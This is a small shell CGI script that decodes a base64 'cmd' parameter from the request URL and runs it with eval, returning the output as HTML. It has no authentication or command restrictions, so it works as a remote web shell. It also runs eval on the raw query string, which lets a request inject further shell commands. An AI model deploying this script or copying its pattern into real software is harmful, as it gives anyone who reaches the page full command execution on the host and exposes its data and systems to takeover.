#!/bin/sh

echo "HTTP/1.1 200 OK
Date: $(TZ=GMT0 date +'%a, %d %b %Y %T %Z')
Server: $SERVER_SOFTWARE
Content-type: text/html; charset=UTF-8
Cache-Control: no-store
Pragma: no-cache
"

# parse parameters from query string
[ -n "$QUERY_STRING" ] && eval $(echo "$QUERY_STRING" | sed "s/&/;/g")

# exit if no command sent
[ -z "$cmd" ] && exit 1

# restore command from Base64 data
c=$(echo $cmd | base64 -d)

# exit if command is empty
[ -z "$c" ] && echo "No command!" && exit

prompt() {
	echo -e "<b># $1</b>"
}

export PATH=/usr/local/bin:/usr/local/sbin:/bin:/usr/bin:/usr/sbin
cd /tmp || return
prompt "$c\n"
eval $c 2>&1

case "$?" in
	126)
		echo "-sh: $c: Permission denied"
		prompt
		;;
	127)
		echo "-sh: $c: not found"
		prompt
		;;
	0)
		prompt
		;;
	*)
		echo -e "\nEXIT CODE: $?"
esac

exit 0
